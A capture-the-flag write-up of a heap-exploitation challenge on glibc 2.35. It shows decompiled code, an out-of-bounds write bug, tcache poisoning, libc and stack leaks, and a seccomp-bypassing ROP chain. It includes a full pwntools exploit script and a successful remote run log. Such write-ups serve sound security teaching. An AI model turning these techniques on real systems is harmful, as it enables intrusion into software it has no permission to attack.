# Write me a book

> Write me a Book  
>349  
>  
>Give back to the library! Share your thoughts and experiences!  
>  
>The flag can be found in /flag  
>  
>    Elma  
>  
>nc 34.124.157.94 12346

Write me a book is a heap challenge I did during the [Grey Cat The Flag 2023
Qualifiers](https://nusgreyhats.org/). You can find the tasks and the exploit
[here](https://github.com/ret2school/ctf/tree/master/2023/greyctf/pwn/writemeabook).

## TL;DR

To manage to read the flag we have to:  
- create overlapping chunks due to an oob write vulnerability in `rewrite_books`  
- tcache poisoning thanks to the overlapping chunks  
- Overwrite the first entry of `@books` to then be able to rewrite 4 entries of `@books` by setting a large size.  
- With the read / write primitives of `@books` we leak `&stdout@glibc` and `environ`, this way getting a libc and stack leak.  
- This way we can simply ROP over a given stackframe.

## General overview

Let's take a look at the protections and the version of the libc:  
```  
$ ./libc.so.6  
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.  
Copyright (C) 2022 Free Software Foundation, Inc.  
This is free software; see the source for copying conditions.  
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A  
PARTICULAR PURPOSE.  
Compiled by GNU CC version 11.2.0.  
libc ABIs: UNIQUE IFUNC ABSOLUTE  
For bug reporting instructions, please see:  
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.  
$ checksec --file ./libc.so.6  
[*]
'/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ret2school/ctf/2023/greyctf/pwn/writemeabook/dist/libc.so.6'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
```

So a very recent one with standards protections. Then let's take a look at the
binary:  
```  
$ checksec --file chall  
[*]
'/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ret2school/ctf/2023/greyctf/pwn/writemeabook/dist/chall'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x3fd000)  
   RUNPATH:  b'/home/nasm/Documents/pwn/greycat/writemeabook/dist'  
$ seccomp-tools dump ./chall  
Welcome to the library of hopes and dreams!

We heard about your journey...  
and we want you to share about your experiences!

What would you like your author signature to be?  
> aa

Great! We would like you to write no more than 10 books :)  
Please feel at home.  
line  CODE  JT   JF      K  
=================================  
0000: 0x20 0x00 0x00 0x00000004  A = arch  
0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011  
0002: 0x20 0x00 0x00 0x00000000  A = sys_number  
0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005  
0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011  
0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010  
0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010  
0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010  
0008: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0010  
0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011  
0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW  
0011: 0x06 0x00 0x00 0x00000000  return KILL  
```

The binary isn't PIE based and does have a seccomp that allows only `read`,
`write`, `open` and `exit`. Which will make the exploitation harder (but not
that much).

## Code review

The `main` looks like this:  
```c  
int __cdecl main(int argc, const char **argv, const char **envp)  
{  
 setup(argc, argv, envp);  
 puts("Welcome to the library of hopes and dreams!");  
 puts("\nWe heard about your journey...");  
 puts("and we want you to share about your experiences!");  
 puts("\nWhat would you like your author signature to be?");  
 printf("> ");  
 LODWORD(author_signature) = ' yb';  
 __isoc99_scanf("%12s", (char *)&author_signature + 3);  
 puts("\nGreat! We would like you to write no more than 10 books :)");  
 puts("Please feel at home.");  
 secure_library();  
 write_books();  
 return puts("Goodbye!");  
}  
```  
We have to give a signature (12 bytes max) sorted in `author_signatures`, then
the program is allocating a lot of chunks in `secure_library`. Finally it
calls `write_books` which contains the main logic:  
```c  
unsigned __int64 write_books()  
{  
 int choice; // [rsp+0h] [rbp-10h] BYREF  
 int fav_num; // [rsp+4h] [rbp-Ch] BYREF  
 unsigned __int64 v3; // [rsp+8h] [rbp-8h]

 v3 = __readfsqword(0x28u);  
 while ( 1 )  
 {  
   while ( 1 )  
   {  
     print_menu();  
     __isoc99_scanf("%d", &choice);  
     getchar();  
     if ( choice != 1337 )  
       break;  
     if ( !secret_msg )  
     {  
       printf("What is your favourite number? ");  
       __isoc99_scanf("%d", &fav_num);  
       if ( fav_num > 0 && fav_num <= 10 && slot[2 * fav_num - 2] )  
         printf("You found a secret message: %p\n", slot[2 * fav_num - 2]);  
       secret_msg = 1;  
     }  
LABEL_19:  
     puts("Invalid choice.");  
   }  
   if ( choice > 1337 )  
     goto LABEL_19;  
   if ( choice == 4 )  
     return v3 - __readfsqword(0x28u);  
   if ( choice > 4 )  
     goto LABEL_19;  
   switch ( choice )  
   {  
     case 3:  
       throw_book();  
       break;  
     case 1:  
       write_book();  
       break;  
     case 2:  
       rewrite_book();  
       break;  
     default:  
       goto LABEL_19;  
   }  
 }  
}  
```

There are basically three handlers:  
- `1337`, we can leak only one time the address of a given allocated chunk.  
- `4` returns.  
- `3` free a chunk.  
- `1` add a book.  
- `2` edit a book.

Let's take a quick look at each handler, first the free handler:  
```c  
unsigned __int64 throw_book()  
{  
 int v1; // [rsp+4h] [rbp-Ch] BYREF  
 unsigned __int64 v2; // [rsp+8h] [rbp-8h]

 v2 = __readfsqword(0x28u);  
 puts("\nAt which index of the shelf would you like to throw your book?");  
 printf("Index: ");  
 __isoc99_scanf("%d", &v1;;  
 getchar();  
 if ( v1 > 0 && v1 <= 10 && slot[2 * v1 - 2] )  
 {  
   free(slot[2 * --v1]);  
   slot[2 * v1] = 0LL;  
   puts("Your book has been thrown!\n");  
 }  
 else  
 {  
   puts("Invaid slot!");  
 }  
 return v2 - __readfsqword(0x28u);  
}  
```  
It only checks is the entry exists and if the index is in the right range. if
it does it frees the entry and zeroes it.

Then, the add handler:  
```c  
unsigned __int64 write_book()  
{  
 int idx2; // ebx  
 _QWORD *v1; // rcx  
 __int64 v2; // rdx  
 int idx; // [rsp+4h] [rbp-4Ch] BYREF  
 size_t size; // [rsp+8h] [rbp-48h]  
 char buf[32]; // [rsp+10h] [rbp-40h] BYREF  
 char v7; // [rsp+30h] [rbp-20h]  
 unsigned __int64 v8; // [rsp+38h] [rbp-18h]

 v8 = __readfsqword(0x28u);  
 puts("\nAt which index of the shelf would you like to insert your book?");  
 printf("Index: ");  
 __isoc99_scanf("%d", &idx);  
 getchar();  
 if ( idx <= 0 || idx > 10 || slot[2 * idx - 2] )  
 {  
   puts("Invaid slot!");  
 }  
 else  
 {  
   --idx;  
   memset(buf, 0, sizeof(buf));  
   v7 = 0;  
   puts("Write me a book no more than 32 characters long!");  
   size = read(0, buf, 0x20uLL) + 0x10;  
   idx2 = idx;  
   slot[2 * idx2] = malloc(size);  
   memcpy(slot[2 * idx], buf, size - 0x10);  
   v1 = (char *)slot[2 * idx] + size - 0x10;  
   v2 = qword_4040D8;  
   *v1 = *(_QWORD *)author_signature;  
   v1[1] = v2;  
   books[idx].size = size;  
   puts("Your book has been published!\n");  
 }  
 return v8 - __readfsqword(0x28u);  
}  
```  
We can allocate a chunk between `0x10` and `0x20 + 0x10` bytes and after we
wrote in it the signature initially choose at the begin of the execution is
put right after the end of the input.

Finally comes the handler where lies the vuln, the edit handler:  
```c  
unsigned __int64 rewrite_book()  
{  
 _QWORD *v0; // rcx  
 __int64 v1; // rdx  
 int idx; // [rsp+Ch] [rbp-14h] BYREF  
 ssize_t v4; // [rsp+10h] [rbp-10h]  
 unsigned __int64 v5; // [rsp+18h] [rbp-8h]

 v5 = __readfsqword(0x28u);  
 puts("\nAt which index of the shelf would you like to rewrite your book?");  
 printf("Index: ");  
 __isoc99_scanf("%d", &idx);  
 getchar();  
 if ( idx > 0 && idx <= 10 && slot[2 * idx - 2] )  
 {  
   --idx;  
   puts("Write me the new contents of your book that is no longer than what it
was before.");  
   v4 = read(0, slot[2 * idx], books[idx].size);  
   v0 = (__int64 *)((char *)slot[2 * idx]->buf + v4);  
   v1 = qword_4040D8;  
   *v0 = author_signature;  
   v0[1] = v1;  
   puts("Your book has been rewritten!\n");  
 }  
 else  
 {  
   puts("Invaid slot!");  
 }  
 return v5 - __readfsqword(0x28u);  
}  
```  
As you can read there is an out of bound write if we input `books[idx].size`
bytes, indeed given the chunk stores only `books[idx].size` bytes the
signature writes over the current chunk. And most of the time on the header
(and especially the size) of the next chunk allocated in memory resulting an
overlapping chunk.

## Exploitation

Given we can get overlapping chunks we're able to do tcache poisoning on the
`0x40` tcachebin (to deeply understand why I advice you to read the exploit
and to run it into gdb). At this point we can simply write the first entry of
`@books` that is stored at a fixed memory area within the binary (no PIE). In
this new entry we could write a pointer to itself but with a large size in
order to be able to write several entries of `@books`. When it is done we
could write these entries:  
```py  
   edit(1, pwn.flat([  
           # 1==  
           0xff, # sz  
           exe.sym.stdout, # to leak libc  
           # 2==  
           0x8, # sz  
           exe.got.free, # to do GOT hiijacking  
           # 3==  
           0x8, # sz  
           exe.sym.secret_msg, # to be able to print an entry of @books  
           # 4==  
           0xff, # sz  
           exe.sym.books # ptr to itself to be able to rewrite the entries when we need to do so  
       ] + [0] * 0x60, filler = b"\x00"))  
```

This way we can easily leak libc.

## Leaking libc

Leaking libc is very easy given we already setup the entries of `@books`. We
can replace `free@GOT` by `puts@plt`. This way the next time free will be
called on an entry, it will leak the datas towards which the entry points.
Which means `free(book[1])` leaks the address of stdout within the libc.  
```py  
STDOUT = 0x21a780

# [...]

def libc_leak_free(idx):  
   io.sendlineafter(b"Option: ", b"3")  
   io.sendlineafter(b"Index: ", str(idx).encode())  
   return pwn.unpack(io.recvline().replace(b"\n", b"").ljust(8, b"\x00")) -
STDOUT

# [...]

# libc leak  
libc.address = libc_leak_free(1)  
pwn.log.success(f"libc: {hex(libc.address)}")  
```

## Leaking the stack

Leaking the libc is cool but given the binary has a seccomp we cannot write
one_gadgets on `__malloc_hook` or `__free_hook` or within the GOT (of the libc
or of the binary) because of the seccomp. We have to do a ROPchain, to do so
we could use `setcontext` but for this libc it is made around `rdx` that we do
not control. Or we could simply leak `environ` to get the address of a
stackframe from which we could return. That's what we gonna do on the
`rewrite_books` stackframe.  
```py  
def leak_environ(idx):  
   io.sendlineafter(b"Option: ", b"3")  
   io.sendlineafter(b"Index: ", str(idx).encode())  
   return pwn.unpack(io.recvline().replace(b"\n", b"").ljust(8, b"\x00"))

# leak stack (environ)  
edit(4, pwn.flat([  
       # 1==  
       0xff, # sz  
       libc.sym.environ # target  
   ], filler = b"\x00"))

environ = leak_environ(1)  
pwn.log.success(f"environ: {hex(environ)}")

stackframe_rewrite = environ - 0x150  
pwn.log.success(f"stackframe_rewrite: {hex(stackframe_rewrite)}")  
```

## ROPchain

Everything is ready for the ROPchain, we cannot use mprotect to use a
shellcode within the seccomp forbids it. We just have to set the first entry
to the stackframe we'd like to hiijack and that's it, then we just need call
edit on this entry and the ROPchain is written and triggered at the return of
the function!  
```py  
rop = pwn.ROP(libc, base=stackframe_rewrite)

# setup the write to the rewrite stackframe  
edit(4, pwn.flat([  
       # 1==  
       0xff, # sz  
       stackframe_rewrite # target  
   ], filler = b"\x00"))

# ROPchain  
rop(rax=pwn.constants.SYS_open, rdi=stackframe_rewrite + 0xde + 2,
rsi=pwn.constants.O_RDONLY) # open  
rop.call(rop.find_gadget(["syscall", "ret"]))  
rop(rax=pwn.constants.SYS_read, rdi=3, rsi=heap_leak, rdx=0x100) # file
descriptor bf ...  
rop.call(rop.find_gadget(["syscall", "ret"]))

rop(rax=pwn.constants.SYS_write, rdi=1, rsi=heap_leak, rdx=0x100) # write  
rop.call(rop.find_gadget(["syscall", "ret"]))  
rop.exit(0x1337)  
rop.raw(b"/flag\x00")

print(rop.dump())  
print(hex(len(rop.chain()) - 8))

# write and trigger the ROPchain  
edit(1, rop.chain())  
```

## PROFIT

Finally:  
```  
nasm@off:~/Documents/pwn/greycat/writemeabook/dist$ python3 exploit.py REMOTE
HOST=34.124.157.94 PORT=12346  
[*] '/home/nasm/Documents/pwn/greycat/writemeabook/dist/chall'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x3fd000)  
   RUNPATH:  b'/home/nasm/Documents/pwn/greycat/writemeabook/dist'  
[*] '/home/nasm/Documents/pwn/greycat/writemeabook/dist/libc.so.6'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
[*] '/home/nasm/Documents/pwn/greycat/writemeabook/dist/ld-linux-x86-64.so.2'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
[+] Opening connection to 34.124.157.94 on port 12346: Done  
[+] heap: 0x81a000  
[*] Encrypted fp: 0x40484d  
[+] libc: 0x7f162182f000  
[+] environ: 0x7ffe60582c98  
[+] stackframe_rewrite: 0x7ffe60582b48  
[*] Loaded 218 cached gadgets for
'/home/nasm/Documents/pwn/greycat/writemeabook/dist/libc.so.6'  
0x7ffe60582b48:   0x7f1621874eb0 pop rax; ret  
0x7ffe60582b50:              0x2 SYS_open  
0x7ffe60582b58:   0x7f162185ae51 pop rsi; ret  
0x7ffe60582b60:              0x0 O_RDONLY  
0x7ffe60582b68:   0x7f16218593e5 pop rdi; ret  
0x7ffe60582b70:   0x7ffe60582c28 (+0xb8)  
0x7ffe60582b78:   0x7f16218c0396 syscall; ret  
0x7ffe60582b80:   0x7f16218bf528 pop rax; pop rdx; pop rbx; ret  
0x7ffe60582b88:              0x0 SYS_read  
0x7ffe60582b90:            0x100  
0x7ffe60582b98:      b'uaaavaaa' <pad rbx>  
0x7ffe60582ba0:   0x7f162185ae51 pop rsi; ret  
0x7ffe60582ba8:         0x81a000  
0x7ffe60582bb0:   0x7f16218593e5 pop rdi; ret  
0x7ffe60582bb8:              0x3  
0x7ffe60582bc0:   0x7f16218c0396 syscall; ret  
0x7ffe60582bc8:   0x7f16218bf528 pop rax; pop rdx; pop rbx; ret  
0x7ffe60582bd0:              0x1 SYS_write  
0x7ffe60582bd8:            0x100  
0x7ffe60582be0:      b'naaboaab' <pad rbx>  
0x7ffe60582be8:   0x7f162185ae51 pop rsi; ret  
0x7ffe60582bf0:         0x81a000  
0x7ffe60582bf8:   0x7f16218593e5 pop rdi; ret  
0x7ffe60582c00:              0x1  
0x7ffe60582c08:   0x7f16218c0396 syscall; ret  
0x7ffe60582c10:   0x7f16218593e5 pop rdi; ret  
0x7ffe60582c18:           0x1337 [arg0] rdi = 4919  
0x7ffe60582c20:   0x7f16218745f0 exit  
0x7ffe60582c28:     b'/flag\x00' b'/flag\x00'  
0xde  
[*] Switching to interactive mode  
Your book has been rewritten!

grey{gr00m1ng_4nd_sc4nn1ng_th3_b00ks!!}  
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb9\x81\x00\x00\x00\xb8\x81\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb1\x81\x00\x00\x00\x00\x00\x00\x00\xc0\x81\x00\[*]
Got EOF while reading in interactive  
$ exit  
$  
[*] Closed connection to 34.124.157.94 port 12346  
[*] Got EOF while sending in interactive  
```

## Conclusion

That was a nice medium heap challenge, even though that was pretty classic.
You can find the tasks and the exploit
[here](https://github.com/ret2school/ctf/tree/master/2023/greyctf/pwn/writemeabook).

## Annexes

Final exploit (with comments):  
```py  
#!/usr/bin/env python  
# -*- coding: utf-8 -*-

# this exploit was generated via  
# 1) pwntools  
# 2) ctfmate

import os  
import time  
import pwn

BINARY = "chall"  
LIBC = "/home/nasm/Documents/pwn/greycat/writemeabook/dist/libc.so.6"  
LD = "/home/nasm/Documents/pwn/greycat/writemeabook/dist/ld-linux-x86-64.so.2"

# Set up pwntools for the correct architecture  
exe = pwn.context.binary = pwn.ELF(BINARY)  
libc = pwn.ELF(LIBC)  
ld = pwn.ELF(LD)  
pwn.context.terminal = ["tmux", "splitw", "-h"]  
pwn.context.delete_corefiles = True  
pwn.context.rename_corefiles = False  
p64 = pwn.p64  
u64 = pwn.u64  
p32 = pwn.p32  
u32 = pwn.u32  
p16 = pwn.p16  
u16 = pwn.u16  
p8  = pwn.p8  
u8  = pwn.u8

host = pwn.args.HOST or '127.0.0.1'  
port = int(pwn.args.PORT or 1337)

def local(argv=[], *a, **kw):  
   '''Execute the target binary locally'''  
   if pwn.args.GDB:  
       return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)  
   else:  
       return pwn.process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):  
   '''Connect to the process on the remote host'''  
   io = pwn.connect(host, port)  
   if pwn.args.GDB:  
       pwn.gdb.attach(io, gdbscript=gdbscript)  
   return io

def start(argv=[], *a, **kw):  
   '''Start the exploit against the target.'''  
   if pwn.args.LOCAL:  
       return local(argv, *a, **kw)  
   else:  
       return remote(argv, *a, **kw)

gdbscript = '''  
source /home/nasm/Downloads/pwndbg/gdbinit.py  
'''.format(**locals())

HEAP_OFFT = 0x3d10  
CHUNK3_OFFT = 0x3d50  
STDOUT = 0x21a780

def encode_ptr(heap, offt, value):  
   return ((heap + offt) >> 12) ^ value

import subprocess  
def one_gadget(filename):  
 return [int(i) for i in subprocess.check_output(['one_gadget', '--raw',
filename]).decode().split(' ')]

def exp():

   io = start()

   def init(flip):  
       io.sendlineafter(b"> ", flip)  
  
   def add(idx, data: bytes):  
       io.sendlineafter(b"Option: ", b"1")  
       io.sendlineafter(b"Index: ", str(idx).encode())  
       io.sendlineafter(b"Write me a book no more than 32 characters long!\n", data)

   def edit(idx, data):  
       io.sendlineafter(b"Option: ", b"2")  
       io.sendlineafter(b"Index: ", str(idx).encode())  
       io.sendlineafter(b"Write me the new contents of your book that is no longer than what it was before.\n", data)

   def free(idx):  
       io.sendlineafter(b"Option: ", b"3")  
       io.sendlineafter(b"Index: ", str(idx).encode())

   def heapLeak(idx):  
       io.sendlineafter(b"Option: ", b"1337")  
       io.sendlineafter(b"What is your favourite number? ", str(idx).encode())  
       io.recvuntil(b"You found a secret message: ")  
       return int(io.recvline().replace(b"\n", b"").decode(), 16) - HEAP_OFFT

   def enable_print(idx):  
       edit(idx, b"".join([  
           pwn.p64(0)  
       ]))

   def libc_leak_free(idx):  
       io.sendlineafter(b"Option: ", b"3")  
       io.sendlineafter(b"Index: ", str(idx).encode())  
       return pwn.unpack(io.recvline().replace(b"\n", b"").ljust(8, b"\x00")) - STDOUT

   def leak_environ(idx):  
       io.sendlineafter(b"Option: ", b"3")  
       io.sendlineafter(b"Index: ", str(idx).encode())  
       return pwn.unpack(io.recvline().replace(b"\n", b"").ljust(8, b"\x00"))

   init(b"m"*4 + pwn.p8(0x41))

   add(1, b"K"*0x10)  
   heap_leak = heapLeak(1)  
   pwn.log.success(f"heap: {hex(heap_leak)}")

   # victim  
   add(2, b"")  
   add(3, b"".join([   b"A"*0x10,  
                       pwn.p64(0), # prev_sz  
                       pwn.p64(0x21) # fake size  
                   ]))  
  
   add(4, b"".join([   b"A"*0x10,  
                       pwn.p64(0), # prev_sz  
                       pwn.p64(0x21) # fake size  
                   ]))  
   free(4) # count for 0x40 tcachebin = 1

   # chunk2 => sz extended  
   edit(1, b"K"*0x20)  
   # chunk2 => tcachebin 0x40, count = 2  
   free(2)

   # oob write over chunk3, we keep valid header  
   add(2, b"".join([   pwn.p64(0)*3,  
                       pwn.p64(0x41) # valid size to end up in the 0x40 tcache bin  
                   ])) # count = 1

   # chunk3 => 0x40 tcachebin, count = 2  
   free(3)

pwn.log.info(f"Encrypted fp: {hex(encode_ptr(heap_leak, CHUNK3_OFFT,
exe.got.printf))}")

   # tcache poisoning  
   edit(2, b"".join([   pwn.p64(0)*3,  
                        pwn.p64(0x41), # valid size  
                        pwn.p64(encode_ptr(heap_leak, CHUNK3_OFFT, exe.sym.books)) # forward ptr  
                    ]))

   # dumb  
   add(3, b"A"*0x20) # count = 1

   # arbitrary write to @books, this way books[1] is user controlled  
   add(4, b"".join([  
       pwn.p64(0x1000), # sz  
       pwn.p64(exe.sym.books), # target  
       b"P"*0x10  
   ])) # count = 0

   # we can write way more due to the previous call  
   edit(1, pwn.flat([  
           # 1==  
           0xff, # sz  
           exe.sym.stdout, # target  
           # 2==  
           0x8, # sz  
           exe.got.free, # target  
           # 3==  
           0x8, # sz  
           exe.sym.secret_msg, # target  
           # 4==  
           0xff, # sz  
           exe.sym.books # target  
       ] + [0] * 0x60, filler = b"\x00"))  
  
   # free@got => puts  
   edit(2, b"".join([  
           pwn.p64(exe.sym.puts)  
       ]))  
  
   # can print = true  
   enable_print(3)

   # libc leak  
   libc.address = libc_leak_free(1)  
   pwn.log.success(f"libc: {hex(libc.address)}")

   # leak stack (environ)  
   edit(4, pwn.flat([  
           # 1==  
           0xff, # sz  
           libc.sym.environ # target  
       ], filler = b"\x00"))

   environ = leak_environ(1)  
   pwn.log.success(f"environ: {hex(environ)}")

   stackframe_rewrite = environ - 0x150  
   pwn.log.success(f"stackframe_rewrite: {hex(stackframe_rewrite)}")

   rop = pwn.ROP(libc, base=stackframe_rewrite)

   # setup the write to the rewrite stackframe  
   edit(4, pwn.flat([  
           # 1==  
           0xff, # sz  
           stackframe_rewrite # target  
       ], filler = b"\x00"))

   # ROPchain  
   rop(rax=pwn.constants.SYS_open, rdi=stackframe_rewrite + 0xde + 2,
rsi=pwn.constants.O_RDONLY) # open  
   rop.call(rop.find_gadget(["syscall", "ret"]))  
   rop(rax=pwn.constants.SYS_read, rdi=3, rsi=heap_leak, rdx=0x100) # file
descriptor bf ...  
   rop.call(rop.find_gadget(["syscall", "ret"]))

   rop(rax=pwn.constants.SYS_write, rdi=1, rsi=heap_leak, rdx=0x100) # write  
   rop.call(rop.find_gadget(["syscall", "ret"]))  
   rop.exit(0x1337)  
   rop.raw(b"/flag\x00")

   print(rop.dump())  
   print(hex(len(rop.chain()) - 8))

   # write and trigger the ROPchain  
   edit(1, rop.chain())  
  
   io.interactive()

if __name__ == "__main__":  
   exp()  
```

Original writeup (https://ret2school.github.io/post/writemeabook/).